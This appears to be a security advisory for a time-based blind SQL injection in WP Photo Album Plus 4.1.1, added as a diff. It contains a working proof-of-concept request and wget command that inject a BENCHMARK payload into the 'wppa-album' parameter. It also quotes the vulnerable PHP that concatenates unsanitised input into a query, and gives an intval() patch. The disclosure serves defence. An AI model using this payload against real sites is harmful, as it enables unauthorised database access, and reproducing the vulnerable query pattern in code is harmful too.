@@ -1,0 +1,85 @@
+# Exploit Title: WP Photo Album Plus <= 4.1.1 SQL Injection Vulnerability
+# Date: 2011-10-14
+# Author: Skraps (jackie.craig.sparks(at)live.com jackie.craig.sparks(at)gmail.com @skraps_foo)
+# Plugin Page: http://wordpress.org/extend/plugins/wp-photo-album-plus/
+# Software Link: http://downloads.wordpress.org/plugin/wp-photo-album-plus.zip
+# Version: 4.1.1 (tested)
+
+---------------
+PoC (GET data)
+---------------
+http://127.0.0.1/wordpress/?page_id=7&wppa-album=1 AND 1=IF(2>1,BENCHMARK(500000000,MD5(CHAR(115,113,108,109,97,112))),0)&wppa-cover=0&wppa-occur=1
+wppa-album=1 AND 1=IF(2>1,BENCHMARK(500000000,MD5(CHAR(115,113,108,109,97,112))),0)&wppa-cover=0&wppa-occur=1 
+
+e.g.
+
+wget "http://127.0.0.1/wordpress/?page_id=7&wppa-album=1 AND 1=IF(2>1,BENCHMARK(500000000,MD5(CHAR(115,113,108,109,97,112))),0)&wppa-cover=0&wppa-occur=1"
+
+---------------
+Vulnerable code
+---------------
+Line 76 of wppa-functions.php:
+if ( $this_occur ) $alb = wppa_get_get('album');
+        if ( ! $alb && is_numeric($wppa['start_album']) ) $alb = $wppa['start_album'];
+
+        $separate = wppa_is_separate($alb);
+
+$slide = ( wppa_get_album_title_linktype($alb) == 'slide' ) ? '&amp;wppa-slide' : '';
+
+
+Line 3170 of wppa-functions.php:
+function wppa_get_get($index, $default = false) {
+#xdebug_start_trace('/var/www/xdebug.log');
+        if (isset($_GET['wppa-'.$index])) {             // New syntax first
+                return $_GET['wppa-'.$index];
+        }
+        if (isset($_GET[$index])) {                             // Old syntax
+                return $_GET[$index];
+        }
+        return $default;
+}
+
+Line 3362 of wppa-functions.php:
+function wppa_get_album_title_linktype($alb) {
+global $wpdb;
+        if ( $alb ) $result = $wpdb->get_var("SELECT cover_linktype FROM ".WPPA_ALBUMS." WHERE id = ".$alb." LIMIT 1");
+        else $result = '';
+echo $result;
+        return $result;
+}
+
+---------------
+Patch
+---------------
+*** ./wppa-functions.php	2011-10-03 09:37:48.000000000 -0400
+--- ./wppa-functions.php.new	2011-10-15 16:02:27.996945496 -0400
+***************
+*** 3361,3367 ****
+  
+  function wppa_get_album_title_linktype($alb) {
+  global $wpdb;
+! 
+  	if ( $alb ) $result = $wpdb->get_var("SELECT cover_linktype FROM ".WPPA_ALBUMS." WHERE id = ".$alb." LIMIT 1");
+  	else $result = '';
+  //echo $result;
+--- 3361,3367 ----
+  
+  function wppa_get_album_title_linktype($alb) {
+  global $wpdb;
+! 	$alb=intval($alb);
+  	if ( $alb ) $result = $wpdb->get_var("SELECT cover_linktype FROM ".WPPA_ALBUMS." WHERE id = ".$alb." LIMIT 1");
+  	else $result = '';
+  //echo $result;
+***************
+*** 3384,3387 ****
+  global $wppa;
+  
+  	if ( $wppa['any'] ) echo $wppa['searchresults'];
+! }
+\ No newline at end of file
+--- 3384,3387 ----
+  global $wppa;
+  
+  	if ( $wppa['any'] ) echo $wppa['searchresults'];
+! }
+
